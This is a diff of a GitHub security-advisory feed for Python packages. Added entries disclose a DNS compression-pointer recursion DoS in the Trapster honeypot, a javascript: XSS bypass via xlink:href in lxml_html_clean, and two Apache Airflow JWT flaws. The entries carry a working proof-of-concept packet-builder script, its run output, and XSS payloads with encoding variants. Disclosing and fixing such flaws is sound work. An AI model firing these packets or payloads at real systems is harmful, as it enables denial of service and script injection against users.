@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-07-08T19:04:35.347Z</updated>
+    <updated>2026-07-08T20:55:00.455Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,368 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[trapster] Trapster Community: Unauthenticated malformed DNS compression pointers crash per-packet honeypot handler]]></title>
+        <id>https://github.com/advisories/GHSA-mxwc-wh95-pw4g</id>
+        <link href="https://github.com/advisories/GHSA-mxwc-wh95-pw4g"/>
+        <updated>2026-07-08T20:24:46.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>trapster.libs.dns.decode_labels()</code> decodes DNS names from attacker-supplied UDP packets and recurses <strong>once per RFC 1035 compression pointer</strong> with <strong>no cycle detection and no depth bound</strong>. A single unauthenticated UDP datagram sent to the DNS honeypot drives the function past CPython's recursion limit, raising <code>RecursionError</code>. That exception is not handled anywhere on the <code>datagram_received</code> path, so it escapes into the asyncio event loop's default exception handler, the per-packet proxy task is never created, and a low-rate flood produces sustained CPU burn and log flooding (denial of service of the DNS honeypot module).</p>
+<h2 id="severity">Severity</h2>
+<p>Medium (CVSS:3.1 <code>AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L</code>). Network-reachable, unauthenticated, single-packet, availability-only against the DNS honeypot listener.</p>
+<h2 id="affected-component">Affected component</h2>
+<ul>
+<li>File: <code>trapster/libs/dns.py</code>, function <code>decode_labels()</code> (called by <code>decode_question_section</code> → <code>decode_dns_message</code>).</li>
+<li>Reached from: <code>trapster/modules/dns.py</code>, <code>DnsUdpProtocol.datagram_received()</code> → <code>dns.decode_dns_message(data)</code>, where <code>data</code> is the raw attacker UDP payload received by <code>DnsHoneypot</code> on its configured bind address/port.</li>
+<li>Version tested: latest <code>main</code> at commit <code>23156739de23816657cbc4582ad32094ed1cab43</code>.</li>
+</ul>
+<h2 id="details">Details</h2>
+<p><code>decode_labels</code> implements RFC 1035 §4.1.4 name compression:</p>
+<pre><code class="language-python">def decode_labels(message, offset):
+    labels = []
+    while True:
+        length, = struct.unpack_from("!B", message, offset)
+        if (length &amp; 0xC0) == 0xC0:
+            pointer, = struct.unpack_from("!H", message, offset)
+            offset += 2
+            return labels + decode_labels(message, pointer &amp; 0x3FFF), offset   # &lt;-- recurses per pointer
+        ...
+</code></pre>
+<p>Each compression pointer triggers a fresh recursive call to <code>decode_labels</code>. There is:</p>
+<ul>
+<li><strong>No cycle detection</strong> — a pointer that targets its own offset recurses forever.</li>
+<li><strong>No depth bound</strong> — a chain of distinct forward pointers recurses once per pointer.</li>
+</ul>
+<p>Either shape exhausts the Python stack and raises <code>RecursionError</code>. <code>decode_dns_message</code> does not catch it, and in <code>DnsUdpProtocol.datagram_received</code> the call <code>dns.decode_dns_message(data)</code> is unguarded, so the exception propagates out of <code>datagram_received</code> into the event loop. Each hostile packet therefore aborts its own packet-handling/proxy task, and the loop's default exception handler logs a full traceback for every packet.</p>
+<p>This is the same class of bug fixed upstream in <code>python-zeroconf</code> (compression-pointer recursion), except this implementation additionally lacks the loop/cycle guard that zeroconf already had.</p>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<p>Real-deploy E2E. The actual <code>trapster.modules.dns.DnsHoneypot</code> server is started on a real UDP socket; hostile packets are sent from a separate real client socket over loopback. The event-loop exception handler records what escapes <code>datagram_received</code>.</p>
+<p><code>e2e_poc.py</code>:</p>
+<pre><code class="language-python">import asyncio, struct, socket, sys
+from trapster.modules.dns import DnsHoneypot
+from trapster.logger.base import BaseLogger
+
+HOST, PORT = "127.0.0.1", 15353
+captured_loop_exceptions = []
+
+def build_benign_query(qname=b"example.com"):
+    header = struct.pack("!6H", 0x1234, 0x0100, 1, 0, 0, 0)
+    labels = b"".join(struct.pack("!B", len(p)) + p for p in qname.split(b".")) + b"\x00"
+    return header + labels + struct.pack("!2H", 1, 1)
+
+def build_self_pointer():
+    header = struct.pack("!6H", 0x1234, 0x0100, 1, 0, 0, 0)
+    name = struct.pack("!H", 0xC000 | 12)   # pointer to offset 12 == this name
+    return header + name + struct.pack("!2H", 1, 1)
+
+def build_pointer_chain(depth=2000):
+    header = struct.pack("!6H", 0x1234, 0x0100, 1, 0, 0, 0)
+    name = struct.pack("!H", 0xC000 | 18)
+    qtail = struct.pack("!2H", 1, 1)
+    chain = bytearray()
+    for i in range(depth):
+        chain += struct.pack("!H", 0xC000 | (18 + 2 * (i + 1)))
+    chain += b"\x00"
+    return header + name + qtail + bytes(chain)
+
+def send_udp(payload, timeout=1.0):
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); s.settimeout(timeout)
+    s.sendto(payload, (HOST, PORT))
+    try: return s.recvfrom(4096)[0]
+    except socket.timeout: return None
+    finally: s.close()
+
+async def main():
+    loop = asyncio.get_running_loop()
+    def handler(loopobj, context):
+        exc = context.get("exception")
+        captured_loop_exceptions.append((repr(exc), context.get("message")))
+        print(f"[loop-exception-handler] {type(exc).__name__ if exc else None}: {context.get('message')}")
+    loop.set_exception_handler(handler)
+
+    hp = DnsHoneypot(config={"port": PORT, "target_dns": "127.0.0.1"},
+                     logger=BaseLogger(node_id="e2e"), bindaddr=HOST)
+    await hp.start(); await asyncio.sleep(0.4)
+    print(f"[deploy] DnsHoneypot listening on udp://{HOST}:{PORT}\n")
+
+    print("=== NEGATIVE CONTROL: benign query example.com A ===")
+    captured_loop_exceptions.clear(); send_udp(build_benign_query()); await asyncio.sleep(0.3)
+    print(f"  loop exceptions after benign packet: {len(captured_loop_exceptions)}")
+    assert len(captured_loop_exceptions) == 0
+    print("  -&gt; benign packet parsed cleanly, no exception\n")
+
+    print("=== VECTOR A: single self-referential compression pointer (cycle) ===")
+    captured_loop_exceptions.clear(); pkt = build_self_pointer()
+    print(f"  packet ({len(pkt)} bytes) name field = pointer 0xC00C -&gt; offset 12 (itself)")
+    send_udp(pkt); await asyncio.sleep(0.5)
+    print(f"  loop exceptions captured: {len(captured_loop_exceptions)}")
+    for e in captured_loop_exceptions: print(f"    {e}")
+    assert any("RecursionError" in e[0] for e in captured_loop_exceptions)
+    print("  -&gt; RecursionError escaped datagram_received (DoS, no cycle guard)\n")
+
+    print("=== VECTOR B: 2000 chained forward compression pointers (zeroconf shape) ===")
+    captured_loop_exceptions.clear(); pkt = build_pointer_chain(2000)
+    print(f"  packet ({len(pkt)} bytes) = 2000-deep forward pointer chain")
+    send_udp(pkt); await asyncio.sleep(0.5)
+    print(f"  loop exceptions captured: {len(captured_loop_exceptions)}")
+    for e in captured_loop_exceptions: print(f"    {e}")
+    assert any("RecursionError" in e[0] for e in captured_loop_exceptions)
+    print("  -&gt; RecursionError escaped datagram_received (DoS, no depth bound)\n")
+
+    await hp.stop(); print("ALL ASSERTIONS PASSED")
+
+if __name__ == "__main__":
+    sys.setrecursionlimit(1000)
+    asyncio.run(main())
+</code></pre>
+<p>Verbatim run against the deployed honeypot at commit <code>23156739de23816657cbc4582ad32094ed1cab43</code>:</p>
+<pre><code>[deploy] DnsHoneypot listening on udp://127.0.0.1:15353
+
+=== NEGATIVE CONTROL: benign query example.com A ===
+  loop exceptions after benign packet: 0
+  -&gt; benign packet parsed cleanly, no exception
+
+=== VECTOR A: single self-referential compression pointer (cycle) ===
+  packet (18 bytes) name field = pointer 0xC00C -&gt; offset 12 (itself)
+[loop-exception-handler] RecursionError: Exception in callback _SelectorDatagramTransport._read_ready()
+  loop exceptions captured: 1
+    ("RecursionError('maximum recursion depth exceeded in comparison')", 'Exception in callback _SelectorDatagramTransport._read_ready()')
+  -&gt; RecursionError escaped datagram_received (DoS, no cycle guard)
+
+=== VECTOR B: 2000 chained forward compression pointers (zeroconf shape) ===
+  packet (4019 bytes) = 2000-deep forward pointer chain
+[loop-exception-handler] RecursionError: Exception in callback _SelectorDatagramTransport._read_ready()
+  loop exceptions captured: 1
+    ("RecursionError('maximum recursion depth exceeded in comparison')", 'Exception in callback _SelectorDatagramTransport._read_ready()')
+  -&gt; RecursionError escaped datagram_received (DoS, no depth bound)
+
+ALL ASSERTIONS PASSED
+</code></pre>
+<p>The negative control (a well-formed <code>example.com</code> A query) parses with zero exceptions, confirming the crash is specific to the malformed compression input.</p>
+<h2 id="impact">Impact</h2>
+<p>Any host able to send UDP to the DNS honeypot's bind address/port (unauthenticated, no UI) can crash the per-packet handler with a single ~18-byte datagram. A low-rate flood (a few packets per second) keeps the event loop logging full tracebacks and burning CPU, degrading the DNS honeypot and its logging pipeline. Availability impact only; no memory disclosure or code execution.</p>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p>Make <code>decode_labels</code> iterative-bounded: require every compression pointer to point strictly backward to a not-yet-visited offset, which bounds both cycles and long forward chains in O(message length) with no recursion. (This mirrors <code>dnspython</code>'s <code>biggest_pointer</code> design and the zeroconf depth-bound fix.) Replace the bare <code>raise "unknown label encoding"</code> with a real exception, and consider wrapping <code>dns.decode_dns_message(data)</code> in <code>DnsUdpProtocol.datagram_received</code> in a try/except so a malformed packet is logged once rather than escaping to the loop handler.</p>
+<p>Verified fix (benign + legitimate backward-compression names still decode; both hostile vectors are bounded to <code>ValueError</code> with no recursion):</p>
+<pre><code class="language-python">def decode_labels(message, offset):
+    labels = []
+    return_offset = None
+    max_allowed_pointer = len(message)
+    while True:
+        length, = struct.unpack_from("!B", message, offset)
+        if (length &amp; 0xC0) == 0xC0:
+            pointer, = struct.unpack_from("!H", message, offset)
+            if return_offset is None:
+                return_offset = offset + 2
+            target = pointer &amp; 0x3FFF
+            if target &gt;= max_allowed_pointer:
+                raise ValueError("invalid DNS compression pointer")
+            max_allowed_pointer = target
+            offset = target
+            continue
+        if (length &amp; 0xC0) != 0x00:
+            raise ValueError("unknown label encoding")
+        offset += 1
+        if length == 0:
+            return labels, return_offset if return_offset is not None else offset
+        labels.append(*struct.unpack_from("!%ds" % length, message, offset))
+        try:
+            labels[-1] = labels[-1].decode()
+        except UnicodeDecodeError:
+            labels[-1] = str(labels[-1])
+        offset += length
+</code></pre>
+<p>A fix PR will be supplied from a temporary private fork during the embargo.</p>
+<h2 id="credit">Credit</h2>
+<p>Discovered and reported by tonghuaroot.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/0xBallpoint/trapster-community/security/advisories/GHSA-mxwc-wh95-pw4g">https://github.com/0xBallpoint/trapster-community/security/advisories/GHSA-mxwc-wh95-pw4g</a></li>
+<li><a href="https://github.com/advisories/GHSA-mxwc-wh95-pw4g">https://github.com/advisories/GHSA-mxwc-wh95-pw4g</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-mxwc-wh95-pw4g</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-07-08T20:24:46.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[lxml_html_clean] `lxml_html_clean.Cleaner` does not strip `javascript:` URLs from namespaced URL attributes]]></title>
+        <id>https://github.com/advisories/GHSA-4jhm-jv67-739f</id>
+        <link href="https://github.com/advisories/GHSA-4jhm-jv67-739f"/>
+        <updated>2026-07-08T20:23:23.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="lxml_html_cleancleaner-does-not-strip-javascript-urls-from-namespaced-url-attributes-xlinkhref"><code>lxml_html_clean.Cleaner</code> does not strip <code>javascript:</code> URLs from namespaced URL attributes (<code>xlink:href</code>)</h1>
+<p><strong>Reporter:</strong> Guillem Lefait <a href="mailto:guillem@datamq.com">guillem@datamq.com</a> · <strong>Date:</strong> 2026-05-10
+<strong>Affected:</strong> <code>lxml</code> ≤ 6.1.0 and <code>lxml_html_clean</code> ≤ 0.4.4 (latest stable)
+<strong>Confirmed against:</strong> lxml 6.1.0 + lxml_html_clean 0.4.4 on Python 3.13.5, 3.14.4, and 3.15.0a8 (libxml2 2.14.6 / 2.9.14 — bug is in pure-Python sanitizer logic, independent of the libxml2 backend)
+<strong>Root-cause class:</strong> same as CVE-2021-28957 (<code>formaction</code> missing from <code>link_attrs</code>)</p>
+<h2 id="summary">Summary</h2>
+<p><code>Cleaner</code> filters URL schemes (<code>javascript:</code>, <code>vbscript:</code>, …) by walking links via <code>rewrite_links()</code>, which delegates to <code>iterlinks()</code>, which only yields attributes named in <code>lxml.html.defs.link_attrs</code>. That allow-list contains no prefixed names (<code>xlink:href</code>) and no <code>srcset</code>. As a result, when <code>Cleaner</code> is configured with <code>safe_attrs_only=False</code> — a documented option for callers that want lenient attribute handling but still expect URL-scheme scrubbing — <code>&lt;a xlink:href="javascript:…"&gt;</code> survives sanitization untouched, and any browser that follows the SVG-anchor specification will execute the JavaScript when the rendered link is clicked.</p>
+<p><strong>CWE:</strong> CWE-79 (XSS), with CWE-184 (Incomplete List of Disallowed Inputs) as the underlying defect class.</p>
+<h2 id="affected-components">Affected components</h2>
+<table>
+<thead>
+<tr>
+<th>Package</th>
+<th>Versions tested</th>
+<th>File / line</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>lxml</code></td>
+<td>4.9.x, 5.2.1, 6.1.0</td>
+<td><code>src/lxml/html/defs.py:20</code></td>
+</tr>
+<tr>
+<td><code>lxml</code></td>
+<td>"</td>
+<td><code>src/lxml/html/__init__.py:485-528</code></td>
+</tr>
+<tr>
+<td><code>lxml_html_clean</code></td>
+<td>0.4.0 – 0.4.4</td>
+<td><code>lxml_html_clean/clean.py:348,576</code></td>
+</tr>
+</tbody></table>
+<p>The legacy <code>lxml.html.clean</code> module — bundled in <code>lxml &lt; 5.2.0</code> and still installable on newer versions via the <code>lxml[html_clean]</code> extra — shares the same bug.</p>
+<h2 id="root-cause">Root cause</h2>
+<p><code>defs.link_attrs</code> is a flat string set; the literal <code>xlink:href</code> is absent:</p>
+<pre><code class="language-python"># lxml/html/defs.py
+link_attrs = frozenset([
+    'action', 'archive', 'background', 'cite', 'classid',
+    'codebase', 'data', 'href', 'longdesc', 'profile', 'src',
+    'usemap', 'dynsrc', 'lowsrc', 'formaction',
+])
+</code></pre>
+<p><code>HtmlMixin.iterlinks()</code> (<code>lxml/html/__init__.py:526-528</code>) only yields attributes whose key is in that set:</p>
+<pre><code class="language-python">for attrib in link_attrs:
+    if attrib in attribs:
+        yield (el, attrib, attribs[attrib], 0)
+</code></pre>
+<p><code>Cleaner.__call__</code> registers the URL-scheme filter via <code>rewrite_links</code> (<code>lxml_html_clean/clean.py:348</code>), which is a thin wrapper around <code>iterlinks()</code>. Because <code>xlink:href</code> is never yielded, <code>_remove_javascript_link</code> (<code>clean.py:576</code>) is never invoked for it.</p>
+<h2 id="minimal-reproducer">Minimal reproducer</h2>
+<pre><code class="language-python">from lxml import html
+from lxml_html_clean import Cleaner
+
+for payload in (
+    '&lt;svg&gt;&lt;a xlink:href="javascript:alert(1)"&gt;x&lt;/a&gt;&lt;/svg&gt;',
+    '&lt;math&gt;&lt;a xlink:href="javascript:alert(2)"&gt;y&lt;/a&gt;&lt;/math&gt;',
+):
+    tree = html.fromstring(payload)
+    Cleaner(safe_attrs_only=False)(tree)
+    print(html.tostring(tree).decode())
+    print('  iterlinks:', list(html.fromstring(payload).iterlinks()))
+# &lt;svg&gt;&lt;a xlink:href="javascript:alert(1)"&gt;x&lt;/a&gt;&lt;/svg&gt;     ← unchanged
+#   iterlinks: []                                          ← link rewriter blind
+# &lt;math&gt;&lt;a xlink:href="javascript:alert(2)"&gt;y&lt;/a&gt;&lt;/math&gt;   ← unchanged
+#   iterlinks: []                                          ← link rewriter blind
+</code></pre>
+<p>Both SVG and MathML scopes are vulnerable — same allow-list gap, both render anchors that browsers treat as navigable. Other lab-confirmed surviving variants (same scope, different scheme encoding): mixed-case (<code>JaVaScRiPt:</code>), HTML-entity (<code>java&amp;#x73;cript:</code>), embedded tab (<code>java\tscript:</code>).</p>
+<h2 id="impact">Impact</h2>
+<p>A caller that uses <code>Cleaner</code> to neutralise untrusted HTML and chooses <code>safe_attrs_only=False</code> — typically because the application wants to allow custom data-/aria-/vendor attributes — will silently pass <code>javascript:</code> payloads carried on <code>xlink:href</code> through to victim renders. Stored XSS in any application that round-trips user-supplied HTML through this configuration. Reach is conditional on the <code>safe_attrs_only=False</code> toggle, but that is a documented public option; consumers reasonably expect URL-scheme scrubbing to be independent of attribute allow-listing.</p>
+<h2 id="suggested-fix">Suggested fix</h2>
+<p><strong>Extend <code>link_attrs</code></strong> to include <code>xlink:href</code>. In HTML mode, <code>lxml.html</code> keeps prefixed attribute names verbatim — the parsed key is the literal string <code>xlink:href</code>, not a Clark-notation form — so the existing allow-list lookup is a plain string match. Same shape as the CVE-2021-28957 fix:</p>
+<pre><code class="language-diff"> # lxml/html/defs.py
+ link_attrs = frozenset([
+     'action', 'archive', 'background', 'cite', 'classid',
+     'codebase', 'data', 'href', 'longdesc', 'profile', 'src',
+     'usemap', 'dynsrc', 'lowsrc', 'formaction',
++    'xlink:href',
+ ])
+</code></pre>
+<p>This single change closes the reported XSS for both SVG <code>&lt;a xlink:href&gt;</code> and MathML <code>&lt;a xlink:href&gt;</code>. <code>lxml_html_clean</code> is the canonical home of the <code>Cleaner</code> code (881 lines); <code>lxml.html.clean</code> is a 21-line backward-compat shim (<code>from lxml_html_clean import *</code>) that picks up the fix automatically once <code>link_attrs</code> is updated upstream. Since the upstream change requires lxml maintainer action, see the alternative below if a self-contained patch in <code>lxml_html_clean</code> is preferred.</p>
+<p><strong>Alternative (in-package fix, no lxml coordination needed):</strong> add a namespaced-URL-attribute walk inside <code>Cleaner.__call__</code> so the URL-scheme filter doesn't depend on <code>link_attrs</code>. Sketch:</p>
+<pre><code class="language-python"># lxml_html_clean/clean.py — supplements rewrite_links() in __call__
+_NS_URL_ATTRS = ('xlink:href',)  # extend as needed
+_BAD_SCHEME = re.compile(r'^\s*(javascript|vbscript|data):', re.I)
+
+for el in doc.iter():
+    for attr in _NS_URL_ATTRS:
+        if attr in el.attrib and _BAD_SCHEME.match(el.attrib[attr]):
+            del el.attrib[attr]
+</code></pre>
+<p>This decouples the cleaner from the upstream <code>link_attrs</code> set and matches the security-ownership boundary established when the cleaner was extracted in lxml 5.2.0.</p>
+<p><strong>Defense in depth (optional, regardless of which fix path is taken):</strong></p>
+<ul>
+<li>Also handle <code>srcset</code>: the value is a <code>url 1x, url 2x, …</code> descriptor list, so split on commas and validate each candidate URL. Not directly executable in current browsers, but closes the same gap.</li>
+<li>Also accept Clark-notation forms (<code>{http://www.w3.org/1999/xlink}href</code>) so XML-mode callers using <code>lxml.etree</code> get the same protection. HTML mode never produces this form, so not needed for the reported bug.</li>
+</ul>
+<h2 id="severity">Severity</h2>
+<p>CVSS 3.1 base score: <strong>8.2 / High</strong> — <code>AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N</code> (stored XSS; victim must click the SVG anchor; scope-changed because script executes in the rendering origin). PR:N reflects the common case where untrusted HTML enters the sanitizer from anonymous sources (comments, support tickets); deployments that gate writes behind authentication can score with PR:L (→ 7.6).</p>
+<p>Severity is <strong>CONDITIONAL</strong> on the caller passing <code>safe_attrs_only=False</code>. With the class default (<code>True</code>), attribute allow-listing strips <code>xlink:href</code> before scheme scrubbing runs, and the bug does not fire — verified at HEAD: default-config <code>Cleaner()(&lt;svg&gt;&lt;a xlink:href="javascript:…"&gt;x&lt;/a&gt;&lt;/svg&gt;)</code> → <code>&lt;svg&gt;&lt;a&gt;x&lt;/a&gt;&lt;/svg&gt;</code>.</p>
+<h2 id="prior-art--novelty">Prior art / novelty</h2>
+<ul>
+<li><strong>CVE-2021-28957 (lxml 4.6.3)</strong> — same root cause, different attribute (<code>formaction</code>). Fix was a one-line extension of <code>link_attrs</code>. Direct precedent.</li>
+<li><strong>CVE-2022-34473</strong> (Mozilla Sanitizer API) — <code>xlink:href</code> URL bypass primitive in a different sanitizer.</li>
+<li><strong>Bleach (Mozilla, Python)</strong> explicitly handles the <code>xlink</code> namespace; <code>enshrined/svg-sanitize</code> (PHP) ships <code>cleanXlinkHrefs()</code>; DOMPurify scrubs <code>xlink:href</code> via <code>ALLOWED_URI_REGEXP</code>.</li>
+<li><strong><code>nh3</code></strong> (the alternative recommended in <code>lxml_html_clean</code>'s own README for security-sensitive use) is <strong>not vulnerable</strong> to this primitive — verified 2026-05-10 on <code>nh3==0.3.5</code>: with <code>&lt;svg&gt;</code>/<code>&lt;math&gt;</code>/<code>&lt;a&gt;</code> and <code>xlink:href</code> explicitly added to <code>tags</code>/<code>attributes</code>, both SVG and MathML payloads, all four scheme-encoding variants, are stripped (output e.g. <code>&lt;svg&gt;&lt;a rel="noopener noreferrer"&gt;x&lt;/a&gt;&lt;/svg&gt;</code>).</li>
+</ul>
+<h2 id="coordination">Coordination</h2>
+<p>Filing as a private GHSA at <code>fedora-python/lxml_html_clean</code> — <code>lxml_html_clean</code> is the canonical maintainer of the <code>Cleaner</code> code (881 lines) and the security-responsible team since the lxml 5.2.0 split, where the cleaner was extracted out of lxml precisely so cleaner-security reports could land on the right team. The lxml side cannot be filed via GHSA (<code>https://github.com/lxml/lxml/security/advisories/new</code> returns 404 — private reporting is not enabled), so a parallel report has been emailed directly to the lxml maintainer for the upstream <code>defs.link_attrs</code> patch path. You're welcome to coordinate with them directly if you'd prefer the upstream fix over the in-package alternative above.</p>
+<p>Happy to provide a draft patch or PR on either path. No bounty expected.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/fedora-python/lxml_html_clean/security/advisories/GHSA-4jhm-jv67-739f">https://github.com/fedora-python/lxml_html_clean/security/advisories/GHSA-4jhm-jv67-739f</a></li>
+<li><a href="https://github.com/advisories/GHSA-4jhm-jv67-739f">https://github.com/advisories/GHSA-4jhm-jv67-739f</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-4jhm-jv67-739f</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-08T20:23:22.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[apache-airflow] Apache Airflow: Auth manager doesn't invalidate JWT tokens after users click logout]]></title>
+        <id>https://github.com/advisories/GHSA-vr7m-c6v4-8cx8</id>
+        <link href="https://github.com/advisories/GHSA-vr7m-c6v4-8cx8"/>
+        <updated>2026-07-08T19:45:44.000Z</updated>
+        <content type="html"><![CDATA[<p>A bug in Apache Airflow's auth manager logout handling left previously-issued JWT tokens valid after the user clicked logout in the UI: the logout flow for <code>FabAuthManager</code> and <code>KeycloakAuthManager</code> did not actually reach the underlying <code>revoke_token()</code> call, so the JWT remained accepted by the API server until its natural expiry. An attacker holding a previously-issued JWT for a logged-out user could continue to make authenticated API calls as that user. Affects deployments configured with <code>FabAuthManager</code> or <code>KeycloakAuthManager</code> (the bug does not affect SimpleAuthManager). This is a residual gap in the fix for CVE-2025-57735, which addressed cookie-side invalidation in PR #57992 / PR #61339 but did not cover the provider-side <code>revoke_token()</code> reachability in the FAB / Keycloak code paths. Users who already upgraded for CVE-2025-57735 should additionally upgrade to <code>apache-airflow</code> 3.2.2 or later to cover the FAB / Keycloak logout paths.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-48726">https://nvd.nist.gov/vuln/detail/CVE-2026-48726</a></li>
+<li><a href="https://github.com/apache/airflow/pull/67289">https://github.com/apache/airflow/pull/67289</a></li>
+<li><a href="https://lists.apache.org/thread/630jg4z6cjkv4m2yv2ljgmf1zhdj1vqx">https://lists.apache.org/thread/630jg4z6cjkv4m2yv2ljgmf1zhdj1vqx</a></li>
+<li><a href="https://www.cve.org/CVERecord?id=CVE-2025-57735">https://www.cve.org/CVERecord?id=CVE-2025-57735</a></li>
+<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2026-187.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2026-187.yaml</a></li>
+<li><a href="https://github.com/advisories/GHSA-vr7m-c6v4-8cx8">https://github.com/advisories/GHSA-vr7m-c6v4-8cx8</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-vr7m-c6v4-8cx8</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-06-01T09:31:15.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[apache-airflow-core] Apache Airflow: Execution API JWT leaked via KubernetesExecutor worker command-line args]]></title>
+        <id>https://github.com/advisories/GHSA-5j6p-jrrm-6x94</id>
+        <link href="https://github.com/advisories/GHSA-5j6p-jrrm-6x94"/>
+        <updated>2026-07-08T19:45:02.000Z</updated>
+        <content type="html"><![CDATA[<p>A bug in Apache Airflow's KubernetesExecutor caused JWT tokens used by worker pods to authenticate against the Execution API to be passed to the worker container as command-line arguments visible in the pod spec. An authenticated UI/API user with Kubernetes read-only access to the cluster (e.g. <code>pods/get</code> in the Airflow namespace) could harvest the JWT from <code>kubectl describe pod</code> output and then call state-mutating Execution API endpoints — triggering Dag runs, clearing runs, reading or writing Variables / Connections / XComs — as if they were a running task. Affects deployments using the <code>KubernetesExecutor</code>. Users are advised to upgrade to <code>apache-airflow</code> 3.2.2 or later. This is the airflow-core half of the same vulnerability addressed by <a href="https://www.cve.org/CVERecord?id=CVE-2026-27173">CVE-2026-27173</a>, which shipped the apache-airflow-providers-cncf-kubernetes side of the fix. Deployments that already upgraded <code>apache-airflow-providers-cncf-kubernetes</code> to 10.17.0 or later per the CVE-2026-27173 advisory should additionally upgrade <code>apache-airflow</code> to 3.2.2 or later to close the core-side surface — the two fixes are complementary, not duplicates.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-49298">https://nvd.nist.gov/vuln/detail/CVE-2026-49298</a></li>
+<li><a href="https://github.com/apache/airflow/pull/60108">https://github.com/apache/airflow/pull/60108</a></li>
+<li><a href="https://lists.apache.org/thread/wo09vrks8189dzsot39rvrx3vnx102tt">https://lists.apache.org/thread/wo09vrks8189dzsot39rvrx3vnx102tt</a></li>
+<li><a href="https://github.com/advisories/GHSA-5j6p-jrrm-6x94">https://github.com/advisories/GHSA-5j6p-jrrm-6x94</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-5j6p-jrrm-6x94</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-06-01T09:31:15.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[ironic] OpenStack Ironic is Vulnerable to Inclusion of Functionality from Untrusted Control Sphere]]></title>
         <id>https://github.com/advisories/GHSA-wqpv-c3pp-3m58</id>
@@ -1185,175 +1547,5 @@ Content-Type: text/html
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-07-07T16:50:43.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[archivebox] Viewing wget extractor output while logged in as an admin allows archived JS to execute in the admins context]]></title>
-        <id>https://github.com/advisories/GHSA-cr45-98w9-gwqx</id>
-        <link href="https://github.com/advisories/GHSA-cr45-98w9-gwqx"/>
-        <updated>2026-07-07T13:06:55.000Z</updated>
-        <content type="html"><![CDATA[<p>Related issue &amp; discussion:</p>
-<ul>
-<li><a href="https://github.com/ArchiveBox/ArchiveBox/issues/239">https://github.com/ArchiveBox/ArchiveBox/issues/239</a></li>
-<li><a href="https://github.com/ArchiveBox/ArchiveBox/wiki/Security-Overview#publishing">https://github.com/ArchiveBox/ArchiveBox/wiki/Security-Overview#publishing</a></li>
-<li><a href="https://github.com/ArchiveBox/ArchiveBox/wiki/Publishing-Your-Archive#security-concerns">https://github.com/ArchiveBox/ArchiveBox/wiki/Publishing-Your-Archive#security-concerns</a></li>
-</ul>
-<h3 id="impact">Impact</h3>
-<p>Any users who save untrusted URLs and view the content they output.</p>
-<p>The impact is potentially severe if you are logged in to the ArchiveBox admin site in the same browser session and view an archived malicious page designed to target your ArchiveBox instance. Malicious JS could potentially act using your logged-in admin credentials and add/remove/modify snapshots, add/remove/modify ArchiveBox users, and generally do anything an admin user could do. </p>
-<p>The impact is less severe for non-logged-in users, as malicious JS cannot <em>modify</em> any archives, but it can still <em>read</em> all the other archived content by fetching the snapshot index and iterating through it.</p>
-<p>Because all of ArchiveBox's archived content is served from the same host and port as the admin panel with 0 XSS protections, when archived pages are viewed the JS executes in the same context as all the other archived pages (and the admin panel), defeating most of the browser's usual CORS/CSRF security protections and leading to this issue.</p>
-<h3 id="patches">Patches</h3>
-<p>Follow here for progress on mitigating this issue: <a href="https://github.com/ArchiveBox/ArchiveBox/issues/239">https://github.com/ArchiveBox/ArchiveBox/issues/239</a></p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Disable the risky extractors by setting <a href="https://github.com/ArchiveBox/ArchiveBox/wiki/Configuration#save_wget"><code>archivebox config --set SAVE_WGET=False SAVE_DOM=False</code></a>, ensure you are always logged out, or serve only a <a href="https://github.com/ArchiveBox/ArchiveBox/wiki/Publishing-Your-Archive#2-export-and-host-it-as-static-html">static HTML version</a> of your archive.</p>
-<h3 id="references">References</h3>
-<ul>
